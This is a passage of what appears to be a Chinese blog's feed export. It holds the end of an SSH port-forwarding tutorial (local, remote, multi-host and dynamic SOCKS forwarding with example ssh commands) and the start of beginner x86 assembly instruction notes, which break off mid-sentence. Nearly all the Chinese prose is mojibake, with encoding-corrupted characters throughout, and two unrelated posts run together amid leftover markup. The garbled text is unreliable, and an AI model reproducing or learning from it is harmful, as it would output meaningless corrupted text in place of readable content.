å®ç°ä¸­ï¼Œæœ¬åœ°ç«¯å£è½¬å‘ç»‘å®šçš„æ˜¯ lookback æ¥å£ï¼Œ</span><br><span class="line"></span><br><span class="line">è¿™æ„å‘³ç€åªæœ‰ localhost æˆ–è€… 127.0.0.1 æ‰èƒ½ä½¿ç”¨æœ¬æœºçš„ç«¯å£è½¬å‘ , å…¶ä»–æœºå™¨å‘èµ·çš„è¿æ¥åªä¼šå¾—åˆ°â€œ<span class="built_in"> connection </span>refused. â€ã€‚</span><br><span class="line"></span><br><span class="line">å¥½åœ¨ SSH åŒæ—¶æä¾›äº† GatewayPorts å…³é”®å­—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‡å®šå®ƒä¸å…¶ä»–æœºå™¨å…±äº«è¿™ä¸ªæœ¬åœ°ç«¯å£è½¬å‘ã€‚</span><br><span class="line"></span><br><span class="line">ssh -g -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</span><br></pre></td></tr></table></figure><h3 id="è¿œç¨‹è½¬å‘å®ä¾‹åˆ†æ"><a href="#è¿œç¨‹è½¬å‘å®ä¾‹åˆ†æ" class="headerlink" title="è¿œç¨‹è½¬å‘å®ä¾‹åˆ†æ"></a>è¿œç¨‹è½¬å‘å®ä¾‹åˆ†æ</h3><p>æˆ‘ä»¬æ¥çœ‹ç¬¬äºŒä¸ªä¾‹å­ï¼Œè¿™æ¬¡å‡è®¾ç”±äºç½‘ç»œæˆ–é˜²ç«å¢™çš„åŸå› æˆ‘ä»¬ä¸èƒ½ç”¨ SSH ç›´æ¥ä» LdapClientHost è¿æ¥åˆ° LDAP æœåŠ¡å™¨ï¼ˆLdapServertHostï¼‰ï¼Œä½†æ˜¯åå‘è¿æ¥å´æ˜¯è¢«å…è®¸çš„ã€‚é‚£æ­¤æ—¶æˆ‘ä»¬çš„é€‰æ‹©è‡ªç„¶å°±æ˜¯è¿œç¨‹ç«¯å£è½¬å‘äº†ã€‚</p><p>å®ƒçš„å‘½ä»¤æ ¼å¼æ˜¯ï¼š</p><pre><code>ssh -R &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>ä¾‹å¦‚åœ¨ LDAP æœåŠ¡å™¨ï¼ˆLdapServertHostï¼‰ç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><pre><code>$ ssh -R 7001:localhost:389 LdapClientHost</code></pre><p>å›¾ 3. è¿œç¨‹ç«¯å£è½¬å‘<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/81519205.jpg" alt=""><br>å’Œæœ¬åœ°ç«¯å£è½¬å‘ç›¸æ¯”ï¼Œè¿™æ¬¡çš„å›¾é‡Œï¼ŒSSH Server å’Œ SSH Client çš„ä½ç½®å¯¹è°ƒäº†ä¸€ä¸‹ï¼Œä½†æ˜¯æ•°æ®æµä¾ç„¶æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬åœ¨ LdapClientHost ä¸Šçš„åº”ç”¨å°†æ•°æ®å‘é€åˆ°æœ¬æœºçš„ 7001 ç«¯å£ä¸Šï¼Œè€Œæœ¬æœºçš„ SSH Server ä¼šå°† 7001 ç«¯å£æ”¶åˆ°çš„æ•°æ®åŠ å¯†å¹¶è½¬å‘åˆ° LdapServertHost çš„ SSH Client ä¸Šã€‚ SSH Client ä¼šè§£å¯†æ”¶åˆ°çš„æ•°æ®å¹¶å°†ä¹‹è½¬å‘åˆ°ç›‘å¬çš„ LDAP 389 ç«¯å£ä¸Šï¼Œæœ€åå†å°†ä» LDAP è¿”å›çš„æ•°æ®åŸè·¯è¿”å›ä»¥å®Œæˆæ•´ä¸ªæµç¨‹ã€‚</p><p>çœ‹åˆ°è¿™é‡Œï¼Œä½ æ˜¯ä¸æ˜¯ä¼šæœ‰ç‚¹ç³Šæ¶‚äº†ä¹ˆï¼Ÿä¸ºä»€ä¹ˆå«æœ¬åœ°è½¬å‘ï¼Œè€Œæœ‰æ—¶åˆå«è¿œç¨‹è½¬å‘ï¼Ÿè¿™ä¸¤è€…æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><h3 id="æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘çš„å¯¹æ¯”ä¸åˆ†æ"><a href="#æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘çš„å¯¹æ¯”ä¸åˆ†æ" class="headerlink" title="æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘çš„å¯¹æ¯”ä¸åˆ†æ"></a>æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘çš„å¯¹æ¯”ä¸åˆ†æ</h3><p>ä¸é”™ï¼ŒSSH Serverï¼ŒSSH Clientï¼ŒLdapServertHostï¼ŒLdapClientHostï¼Œæœ¬åœ°è½¬å‘ï¼Œè¿œç¨‹è½¬å‘ï¼Œè¿™ä¹ˆå¤šçš„åè¯çš„ç¡®å®¹æ˜“è®©äººç³Šæ¶‚ã€‚è®©æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹å…¶ä¸­çš„ç»“æ„å§ã€‚é¦–å…ˆï¼ŒSSH ç«¯å£è½¬å‘è‡ªç„¶éœ€è¦ SSH è¿æ¥ï¼Œè€Œ SSH è¿æ¥æ˜¯æœ‰æ–¹å‘çš„ï¼Œä» SSH Client åˆ° SSH Server ã€‚è€Œæˆ‘ä»¬çš„åº”ç”¨ä¹Ÿæ˜¯æœ‰æ–¹å‘çš„ï¼Œæ¯”å¦‚éœ€è¦è¿æ¥ LDAP Server æ—¶ï¼ŒLDAP Server è‡ªç„¶å°±æ˜¯ Server ç«¯ï¼Œæˆ‘ä»¬åº”ç”¨è¿æ¥çš„æ–¹å‘ä¹Ÿæ˜¯ä»åº”ç”¨çš„ Client ç«¯è¿æ¥åˆ°åº”ç”¨çš„ Server ç«¯ã€‚å¦‚æœè¿™ä¸¤ä¸ªè¿æ¥çš„æ–¹å‘ä¸€è‡´ï¼Œé‚£æˆ‘ä»¬å°±è¯´å®ƒæ˜¯æœ¬åœ°è½¬å‘ã€‚è€Œå¦‚æœä¸¤ä¸ªæ–¹å‘ä¸ä¸€è‡´ï¼Œæˆ‘ä»¬å°±è¯´å®ƒæ˜¯è¿œç¨‹è½¬å‘ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å›å¿†ä¸Šé¢çš„ä¸¤ä¸ªä¾‹å­æ¥åšä¸ªå¯¹ç…§ã€‚</p><p>æœ¬åœ°è½¬å‘æ—¶ï¼š</p><p>LdapClientHost åŒæ—¶æ˜¯åº”ç”¨çš„å®¢æˆ·ç«¯ï¼Œä¹Ÿæ˜¯ SSH Clientï¼Œè¿™ä¸¤ä¸ªè¿æ¥éƒ½ä»å®ƒæŒ‡å‘ LdapServertHostï¼ˆæ—¢æ˜¯ LDAP æœåŠ¡ç«¯ï¼Œä¹Ÿæ˜¯ SSH Serverï¼‰ã€‚</p><p>è¿œç¨‹è½¬å‘æ—¶ï¼š</p><p>LdapClientHost æ˜¯åº”ç”¨çš„å®¢æˆ·ç«¯ï¼Œä½†å´æ˜¯ SSH Server ï¼›è€Œ LdapServertHost æ˜¯ LDAP çš„æœåŠ¡ç«¯ï¼Œä½†å´æ˜¯ SSH Client ã€‚è¿™æ ·ä¸¤ä¸ªè¿æ¥çš„æ–¹å‘åˆšå¥½ç›¸åã€‚</p><p>å¦ä¸€ä¸ªæ–¹ä¾¿è®°å¿†çš„æ–¹æ³•æ˜¯ï¼ŒServer ç«¯çš„ç«¯å£éƒ½æ˜¯é¢„å®šä¹‰çš„å›ºå®šç«¯å£ï¼ˆSSH Server çš„ç«¯å£ 22ï¼ŒLDAP çš„ç«¯å£ 389ï¼‰ï¼Œè€Œ Client ç«¯çš„ç«¯å£éƒ½æ˜¯åŠ¨æ€å¯ä¾›æˆ‘ä»¬é€‰æ‹©çš„ç«¯å£ï¼ˆå¦‚ä¸Šè¿°ä¾‹å­ä¸­é€‰ç”¨çš„ 7001 ç«¯å£ï¼‰ã€‚å¦‚æœ Server ç«¯çš„ä¸¤ä¸ªç«¯å£éƒ½åœ¨åŒä¸€å°æœºå™¨ï¼ŒClient ç«¯çš„ä¸¤ä¸ªç«¯å£éƒ½åœ¨å¦ä¸€å°æœºå™¨ä¸Šï¼Œé‚£ä¹ˆè¿™å°±æ˜¯æœ¬åœ°è¿æ¥ï¼›å¦‚æœè¿™å››ä¸ªç«¯å£äº¤å‰åˆ†å¸ƒåœ¨ä¸¤ä¸ªæœºå™¨ä¸Šï¼Œæ¯å°æœºå™¨å„æœ‰ä¸€ä¸ª Server ç«¯ç«¯å£ï¼Œä¸€ä¸ª Client ç«¯ç«¯å£ï¼Œé‚£å°±æ˜¯è¿œç¨‹è¿æ¥ã€‚</p><p>å¼„æ¸…æ¥šäº†ä¸¤è€…çš„åŒºåˆ«ä¹‹åï¼Œå†æ¥çœ‹çœ‹ä¸¤è€…çš„ç›¸åŒä¹‹å¤„ã€‚å¦‚æœä½ æ‰€åœ¨çš„ç¯å¢ƒä¸‹ï¼Œæ—¢å…è®¸ LdapClientHost å‘èµ· SSH è¿æ¥åˆ° LdapServerHostï¼Œä¹Ÿå…è®¸ LdapServerHost å‘èµ· SSH è¿æ¥åˆ° LdapClientHost ã€‚é‚£ä¹ˆè¿™æ—¶æˆ‘ä»¬é€‰æ‹©æœ¬åœ°è½¬å‘æˆ–è¿œç¨‹è½¬å‘éƒ½æ˜¯å¯ä»¥çš„ï¼Œèƒ½å®Œæˆä¸€æ ·çš„åŠŸèƒ½ã€‚</p><p>æ¥ç€è®©æˆ‘ä»¬æ¥çœ‹ä¸ªè¿›é˜¶ç‰ˆçš„ç«¯å£è½¬å‘ã€‚æˆ‘ä»¬ä¹‹å‰æ¶‰åŠåˆ°çš„å„ç§è¿æ¥ / è½¬å‘éƒ½åªæ¶‰åŠåˆ°äº†ä¸¤å°æœºå™¨ï¼Œè¿˜è®°å¾—æˆ‘ä»¬åœ¨æœ¬åœ°è½¬å‘ä¸­æåˆ°çš„ä¸€ä¸ªé—®é¢˜ä¹ˆï¼Ÿæœ¬åœ°è½¬å‘å‘½ä»¤ä¸­çš„ <remote host=""> å’Œ <ssh hostname=""> å¯ä»¥æ˜¯ä¸åŒçš„æœºå™¨ä¹ˆï¼Ÿ</ssh></remote></p><pre><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªæ¶‰åŠåˆ°å››å°æœºå™¨ (A,B,C,D) çš„ä¾‹å­ã€‚</p><p>å›¾ 4. å¤šä¸»æœºè½¬å‘åº”ç”¨<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/37833316.jpg" alt=""><br>åœ¨ SSH Client(C) æ‰§è¡Œä¸‹åˆ—å‘½ä»¤æ¥å»ºç«‹ SSH è¿æ¥ä»¥åŠç«¯å£è½¬å‘ï¼š</p><pre><code>$ ssh -g -L 7001:&lt;B&gt;:389 &lt;D&gt;</code></pre><p>ç„¶ååœ¨æˆ‘ä»¬çš„åº”ç”¨å®¢æˆ·ç«¯ï¼ˆAï¼‰ä¸Šé…ç½®è¿æ¥æœºå™¨ï¼ˆC ï¼‰çš„ 7001 ç«¯å£å³å¯ã€‚æ³¨æ„æˆ‘ä»¬åœ¨å‘½ä»¤ä¸­æŒ‡å®šäº†â€œ -g â€å‚æ•°ä»¥ä¿è¯æœºå™¨ï¼ˆAï¼‰èƒ½å¤Ÿä½¿ç”¨æœºå™¨ï¼ˆCï¼‰å»ºç«‹çš„æœ¬åœ°ç«¯å£è½¬å‘ã€‚è€Œå¦ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œåœ¨ä¸Šè¿°è¿æ¥ä¸­ï¼Œï¼ˆAï¼‰<-> (C) ä»¥åŠ (B)<->(D) ä¹‹é—´çš„è¿æ¥å¹¶ä¸æ˜¯å®‰å…¨è¿æ¥ï¼Œå®ƒä»¬ä¹‹é—´æ²¡æœ‰ç»è¿‡ SSH çš„åŠ å¯†åŠè§£å¯†ã€‚å¦‚æœä»–ä»¬ä¹‹é—´çš„ç½‘ç»œå¹¶ä¸æ˜¯å€¼å¾—ä¿¡èµ–çš„ç½‘ç»œè¿æ¥ï¼Œæˆ‘ä»¬å°±éœ€è¦è°¨æ…ä½¿ç”¨è¿™ç§è¿æ¥æ–¹å¼äº†ã€‚</-></-></p><h2 id="å…¶ä»–ç±»å‹çš„è½¬å‘"><a href="#å…¶ä»–ç±»å‹çš„è½¬å‘" class="headerlink" title="å…¶ä»–ç±»å‹çš„è½¬å‘"></a>å…¶ä»–ç±»å‹çš„è½¬å‘</h2><h3 id="åŠ¨æ€è½¬å‘å®ä¾‹åˆ†æ"><a href="#åŠ¨æ€è½¬å‘å®ä¾‹åˆ†æ" class="headerlink" title="åŠ¨æ€è½¬å‘å®ä¾‹åˆ†æ"></a>åŠ¨æ€è½¬å‘å®ä¾‹åˆ†æ</h3><p>æ©ï¼ŒåŠ¨æ€è½¬å‘ï¼Œå¬ä¸Šå»å¾ˆé…·ã€‚å½“ä½ çœ‹åˆ°è¿™é‡Œæ—¶ï¼Œæœ‰æ²¡æœ‰æƒ³è¿‡æˆ‘ä»¬å·²ç»è®¨è®ºè¿‡äº†æœ¬åœ°è½¬å‘ï¼Œè¿œç¨‹è½¬å‘ï¼Œä½†æ˜¯å‰æéƒ½æ˜¯è¦æ±‚æœ‰ä¸€ä¸ªå›ºå®šçš„åº”ç”¨æœåŠ¡ç«¯çš„ç«¯å£å·ï¼Œä¾‹å¦‚å‰é¢ä¾‹å­ä¸­çš„ LDAP æœåŠ¡ç«¯çš„ 389 ç«¯å£ã€‚é‚£å¦‚æœæ²¡æœ‰è¿™ä¸ªç«¯å£å·æ€ä¹ˆåŠï¼Ÿç­‰ç­‰ï¼Œä»€ä¹ˆæ ·çš„åº”ç”¨ä¼šæ²¡æœ‰è¿™ä¸ªç«¯å£å·å‘¢ï¼Ÿå—¯ï¼Œæ¯”å¦‚è¯´ç”¨æµè§ˆå™¨è¿›è¡Œ Web æµè§ˆï¼Œæ¯”å¦‚è¯´ MSN ç­‰ç­‰ã€‚</p><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªä¸å®‰å…¨çš„ WiFi ç¯å¢ƒä¸‹ä¸Šç½‘ï¼Œç”¨ SSH åŠ¨æ€è½¬å‘æ¥ä¿æŠ¤æˆ‘ä»¬çš„ç½‘é¡µæµè§ˆåŠ MSN ä¿¡æ¯æ— ç–‘æ˜¯ååˆ†å¿…è¦çš„ã€‚è®©æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹åŠ¨æ€è½¬å‘çš„å‘½ä»¤æ ¼å¼ï¼š</p><pre><code>$ ssh -D &lt;local port&gt; &lt;SSH Server&gt;</code></pre><p>ä¾‹å¦‚ï¼š</p><pre><code>$ ssh -D 7001 &lt;SSH Server&gt;</code></pre><p>å›¾ 5. åŠ¨æ€ç«¯å£è½¬å‘<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/94677613.jpg" alt=""></p><p>ä¼¼ä¹å¾ˆç®€å•ï¼Œæˆ‘ä»¬ä¾ç„¶é€‰æ‹©äº† 7001 ä½œä¸ºæœ¬åœ°çš„ç«¯å£å·ï¼Œå…¶å®åœ¨è¿™é‡Œ SSH æ˜¯åˆ›å»ºäº†ä¸€ä¸ª SOCKS ä»£ç†æœåŠ¡ã€‚æ¥çœ‹çœ‹å¸®åŠ©æ–‡æ¡£ä¸­å¯¹ -D å‚æ•°çš„æè¿°ï¼š</p><p>-D port<br> This works by allocating a socket to listen to port on the local<br> side, and whenever a connection is made to this port, the con-<br> nection is forwarded over the secure channel, and the applica-<br> tion protocol is then used to determine where to connect to from<br> the remote machine.  Currently the SOCKS4 and SOCKS5 protocols<br> are supported, and ssh will act as a SOCKS server.  Only root<br> can forward privileged ports.  Dynamic port forwardings can also<br> be specified in the configuration file.</p><p>ä¹‹åçš„ä½¿ç”¨å°±ç®€å•äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ localhost:7001 æ¥ä½œä¸ºæ­£å¸¸çš„ SOCKS ä»£ç†æ¥ä½¿ç”¨ï¼Œç›´æ¥åœ¨æµè§ˆå™¨æˆ– MSN ä¸Šè®¾ç½®å³å¯ã€‚åœ¨ SSH Client ç«¯æ— æ³•è®¿é—®çš„ç½‘ç«™ç°åœ¨ä¹Ÿéƒ½å¯ä»¥æ­£å¸¸æµè§ˆã€‚è€Œè¿™é‡Œéœ€è¦å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶ SSH æ‰€åŒ…æŠ¤çš„èŒƒå›´åªåŒ…æ‹¬ä»æµè§ˆå™¨ç«¯ï¼ˆSSH Client ç«¯ï¼‰åˆ° SSH Server ç«¯çš„è¿æ¥ï¼Œå¹¶ä¸åŒ…å«ä» SSH Server ç«¯ åˆ°ç›®æ ‡ç½‘ç«™çš„è¿æ¥ã€‚å¦‚æœååŠæˆªè¿æ¥çš„å®‰å…¨ä¸èƒ½å¾—åˆ°å……åˆ†çš„ä¿è¯çš„è¯ï¼Œè¿™ç§æ–¹å¼ä»ä¸æ˜¯åˆé€‚çš„è§£å†³æ–¹æ¡ˆã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å®Œæˆäº†æœ¬åœ°ç«¯å£è½¬å‘ï¼Œè¿œç¨‹ç«¯å£è½¬å‘ï¼ŒåŠ¨æ€ç«¯å£è½¬å‘ä»¥åŠ X è½¬å‘çš„ä»‹ç»ã€‚å›é¡¾èµ·æ¥ï¼Œæ€»çš„æ€è·¯æ˜¯é€šè¿‡å°† TCP è¿æ¥è½¬å‘åˆ° SSH é€šé“ä¸Šä»¥è§£å†³æ•°æ®åŠ å¯†ä»¥åŠçªç ´é˜²ç«å¢™çš„ç§ç§é™åˆ¶ã€‚å¯¹ä¸€äº›å·²çŸ¥ç«¯å£å·çš„åº”ç”¨ï¼Œä¾‹å¦‚ Telnet/LDAP/SMTPï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æœ¬åœ°ç«¯å£è½¬å‘æˆ–è€…è¿œç¨‹ç«¯å£è½¬å‘æ¥è¾¾åˆ°ç›®çš„ã€‚åŠ¨æ€ç«¯å£è½¬å‘åˆ™å¯ä»¥å®ç° SOCKS ä»£ç†ä»è€ŒåŠ å¯†ä»¥åŠçªç ´é˜²ç«å¢™å¯¹ Web æµè§ˆçš„é™åˆ¶ã€‚å¯¹äº X åº”ç”¨ï¼Œæ— ç–‘æ˜¯ X è½¬å‘æœ€ä¸ºé€‚ç”¨äº†ã€‚è™½ç„¶æ¯ä¸€éƒ¨åˆ†æˆ‘ä»¬éƒ½åªæ˜¯ç®€å•çš„ä»‹ç»äº†ä¸€ä¸‹ï¼Œä½†å¦‚æœèƒ½çµæ´»åº”ç”¨è¿™äº›æŠ€å·§ï¼Œç›¸ä¿¡å¯¹æˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´» / å·¥ä½œä¹Ÿæ˜¯ä¼šæœ‰æ‰€å¸®åŠ©çš„ã€‚</p><p>æ¥è‡ª:<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ±‡ç¼–æŒ‡ä»¤å­¦ä¹ </title>
      <link href="/2018/12/26/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/12/26/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="INT-OUT"><a href="#INT-OUT" class="headerlink" title="INT OUT"></a>INT OUT</h2><p><strong>æœŸæœ«çš„è®¡ç®—æœºç»„æˆåŸç†çš„è¯¾ç¨‹è®¾è®¡,è¦å­¦ä¹ çœ‹æ‡‚æ±‡ç¼–è¯­è¨€,è®°å½•ä¸€äº›æ±‡ç¼–æŒ‡ä»¤</strong><br>CPUå¯¹å¤–è®¾çš„æ“ä½œé€šè¿‡ä¸“é—¨çš„ç«¯å£è¯»å†™æŒ‡ä»¤æ¥å®Œæˆï¼›<br>ã€€ã€€è¯»ç«¯å£ç”¨INæŒ‡ä»¤ï¼Œå†™ç«¯å£ç”¨OUTæŒ‡ä»¤ã€‚</p><pre><code>IN AL,21Hï¼›è¡¨ç¤ºä»21Hç«¯å£è¯»å–ä¸€å­—èŠ‚æ•°æ®åˆ°ALIN AX,21Hï¼›è¡¨ç¤ºä»ç«¯å£åœ°å€21Hè¯»å–1å­—èŠ‚æ•°æ®åˆ°ALï¼Œä»ç«¯å£åœ°å€22Hè¯»å–1å­—èŠ‚åˆ°AH</code></pre><p>MOV DX,379H<br>ã€€ã€€IN AL,DX ï¼›ä»ç«¯å£379Hè¯»å–1å­—èŠ‚åˆ°AL<br>OUT 21H,ALï¼›å°†ALçš„å€¼å†™å…¥21Hç«¯å£<br>ã€€ã€€OUT 21H,AXï¼›å°†AXçš„å€¼å†™å…¥ç«¯å£åœ°å€21Hå¼€å§‹çš„è¿ç»­ä¸¤ä¸ªå­—èŠ‚ã€‚</p><h2 id="assume-cs-code-ds-data"><a href="#assume-cs-code-ds-data" class="headerlink" title="assume cs:code,ds:data"></a>assume cs:code,ds:data</h2><p><strong>assume</strong>ï¼Œè¿™ä¸ªå•è¯æ˜¯â€œå‡è®¾â€çš„æ„æ€,å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œæ®µå¯„å­˜å™¨å’Œæ®µåä¹‹é—´çš„å…³ç³»<br>è¿™æ˜¯æ®µåˆ†é…è¯­å¥ï¼Œæ˜¯æ¡ä¼ªæŒ‡ä»¤ï¼Œä¸€èˆ¬æ”¾åœ¨ä»£ç æ®µçš„ç¬¬ä¸€æ¡ä½ç½®ï¼Œæ®µåˆ†é…è¯­å¥ä»…ä»…æ˜¯å»ºç«‹æ®µå¯„å­˜å™¨å’Œæ®µåä¹‹é—´å…³ç³»ï¼Œä¸å…·æœ‰èµ‹å€¼åŠŸèƒ½ï¼Œ<br>æ¯”å¦‚ä½ åˆ›å»ºäº†å‡ ä¸ªæ®µï¼Œæ€ä¹ˆçŸ¥é“å®ƒæ˜¯ä»£ç æ®µï¼Œå®ƒæ˜¯æ•°æ®æ®µï¼Œå°±é è¿™æ¡è¯­å¥ï¼Œ<br>å› ä¸ºæ®µåæ˜¯å¯ä»¥éšæ„å–çš„ï¼Œä½ å¯ä»¥æŠŠcodeå–æˆä»£ç æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–åå­—ï¼Œé€šè¿‡è¿™æ¡è¯­å¥å°±å¯ä»¥æŠŠä»–ä»¬çš„å…³ç³»å»ºç«‹èµ·æ¥</p><pre><code>mov dx,offset s</code></pre><p>è¿™å¥è¯æ„æ€æ˜¯å°†sçš„åç§»åœ°å€ä¼ ç»™dx</p><h2 id="data-segment"><a href="#data-segment" class="headerlink" title="data segment"></a>data segment</h2><p>å«å®Œæ•´æ®µå®šä¹‰<br>å¯ä»¥éšæ„è®¾ç½®æ®µå±æ€§ï¼Œéšæ„ä½¿ç”¨å„ç§æ®µ<br>ä½†åœ¨ä¸ç†Ÿæ‚‰è¯¥ç¯å¢ƒä¸‹æ®µçš„å®šä¹‰çº¦å®šï¼Œå»ºè®®ä½¿ç”¨ç®€åŒ–æ®µå®šä¹‰ï¼Œå¦åˆ™é€ æˆä¸€ç³»åˆ—å…¼å®¹é—®é¢˜<br>æ±‡ç¼–çš„åŸºæœ¬æ¡†æ¶</p><pre><code>CODE SEGMENT START: ........ //å®šä¹‰ä»£ç æ®µ å½“ç„¶å°±æ˜¯è¦æ‰§è¡Œçš„ç¨‹åºä»£ç äº† CODE ENDS END START</code></pre><h2 id="int-21h"><a href="#int-21h" class="headerlink" title="int 21h"></a>int 21h</h2><p>æ˜¯DOSçš„ä¸­æ–­è°ƒç”¨<br>æ¯”å¦‚</p><pre><code>MOV AH 4CHINT 21H</code></pre><p>æ˜¯è¿”å›DOSç³»ç»Ÿçš„<br>é€šè¿‡ç»™AHå¯„å­˜å™¨èµ‹å€¼4CHï¼Œç„¶åè°ƒç”¨INT 21HæŒ‡ä»¤ï¼Œè®¡ç®—æœºå°±ä¼šæ ¹æ®AHå¯„å­˜å™¨ä¸­çš„å€¼æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œ<br>å…¶ä¸­4CHæ˜¯è¿”å›DOSç³»ç»Ÿï¼Œè¿˜å¯ç»™AHå¯„å­˜å™¨èµ‹å…¶ä»–å€¼ï¼Œæ‰€å¯¹äºçš„æ“ä½œè¿™é‡Œä¹Ÿæœ‰</p><h2 id="leaæŒ‡ä»¤"><a href="#leaæŒ‡ä»¤" class="headerlink" title="leaæŒ‡ä»¤"></a>leaæŒ‡ä»¤</h2><p>å°±æ˜¯ç›®æ ‡åœ°å€ä¼ é€æŒ‡ä»¤ï¼š å°†ä¸€ä¸ªè¿‘åœ°å€æŒ‡é’ˆå†™å…¥åˆ°æŒ‡å®šçš„å¯„å­˜å™¨ã€‚æ ¼å¼ï¼š<br>LEA reg16,mem16<br>å…¶ä¸­reg16å¿…é¡»æ˜¯ä¸€ä¸ª16ä½é€šç”¨å¯„å­˜å™¨ï¼Œmem16å¿…é¡»æ˜¯ä¸€ä¸ªå­˜å‚¨å™¨ï¼Œæ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤åï¼Œå°±å°†mem16æ‰€æŒ‡çš„16ä½åç§»åœ°å€ä¼ é€reg16ä¸­ã€‚<br>æ¯”å¦‚ï¼š LEA AX,BUF<br>å°±æ˜¯å°†å­˜å‚¨å™¨ä¸­BUFæ‰€æŒ‡çš„åœ°å€ä¼ é€ç»™AX.<br>åŒºåˆ«MOVä¼ é€æŒ‡ä»¤ï¼š<br>MOVä¼ é€çš„æ˜¯åœ°å€æ‰€æŒ‡çš„å†…å®¹ï¼Œè€ŒLEAåªæ˜¯åœ°å€ã€‚<br>å½“æºæ“ä½œæ•°å¾ˆç®€å•çš„æƒ…å†µä¸‹ï¼Œå®Œå…¨å¯ä»¥ç”¨movæŒ‡ä»¤ä»£æ›¿leaæŒ‡ä»¤ï¼Œ<br>å¦‚lea esi,Bufferï¼Œå®Œå…¨å¯ä»¥ç”¨æŒ‡ä»¤mov esi,offset Bufferä»£æ›¿ï¼›<br>ä½†å½“æºæ“ä½œæ•°ç¨å¾®å¤æ‚ä¸€ç‚¹çš„è¯ï¼Œå•ç”¨movæŒ‡ä»¤å°±ä»£æ›¿ä¸äº†äº†ï¼Œè‡³å°‘è¦ç”¨åˆ°ç®—æœ¯è¿ç®—æŒ‡ä»¤ã€‚<br>æŒ‡ä»¤é›†ä¸­æä¾›leaæŒ‡ä»¤ï¼Œå°±æ˜¯ä¸ºäº†å‡å°‘è¿™äº›è®¡ç®—ä¸Šçš„éº»çƒ¦ã€‚</p><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><p>å¯ä»¥è®¤ä¸ºæ˜¯compareï¼ˆæ¯”è¾ƒï¼‰çš„æ„æ€ã€‚åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™å°†ä¸ªæ•°åšå‡æ³•è¿ç®—ï¼Œè¿™ä¸ªè¿ç®—æ˜¯å½±å“ç¬¦å·ä½çš„ï¼Œï¼ˆå¤§æ•°å‡å°æ•°ï¼Œç¬¦å·ä½ä¸º+ï¼Œååˆ™ä¸º-ï¼‰<br>æ‰€ä»¥æ‰§è¡Œè¯¥æŒ‡ä»¤åä½ å¯ä»¥é€šè¿‡æŸ¥è¯¢ç¬¦å·ä½CFæ˜¯0è¿˜æ˜¯1å°±å¯ä»¥çŸ¥é“ä¸¤ä¸ªæ•°é‚£ä¸ªå¤§äº†ã€‚</p><h2 id="jnc"><a href="#jnc" class="headerlink" title="jnc"></a>jnc</h2><p>å¯ç”¨äºä¸¤ä¸ªæ•°çš„åˆ¤æ–­ï¼jncæ˜¯è¿›ä½ä½ä¸º0åˆ™è½¬ç§»ï¼è€Œä¸¤ä¸ªæ•°çš„æ¯”è¾ƒå°±æ˜¯æƒ³å‡ï¼Œ<br>ä¾‹å¦‚X-Yï¼ŒXå°äºY,Xå°±è¦å€Ÿä½ï¼Œè¿™æ ·è¿›ä½ä½å°±ä¸º1ï¼Œå¦‚æœXå¤§äºYï¼ŒXå°±ä¸éœ€è¦å€Ÿä½ï¼Œè¿™æ ·è¿›ä½ä½ä¸º0<br>jncæ˜¯ä¸€æ¡è·³è½¬æŒ‡ä»¤ï¼Œå½“è¿›ä½æ ‡è®°Cä¸º0æ—¶è·³è½¬ï¼Œä¸º1æ—¶æ‰§è¡Œåé¢çš„æŒ‡ä»¤ã€‚</p><h2 id="OFä¸CFçš„åŒºåˆ«"><a href="#OFä¸CFçš„åŒºåˆ«" class="headerlink" title="OFä¸CFçš„åŒºåˆ«"></a>OFä¸CFçš„åŒºåˆ«</h2><p>ofçš„è®¾ç½®ï¼Œä»¥åŠ 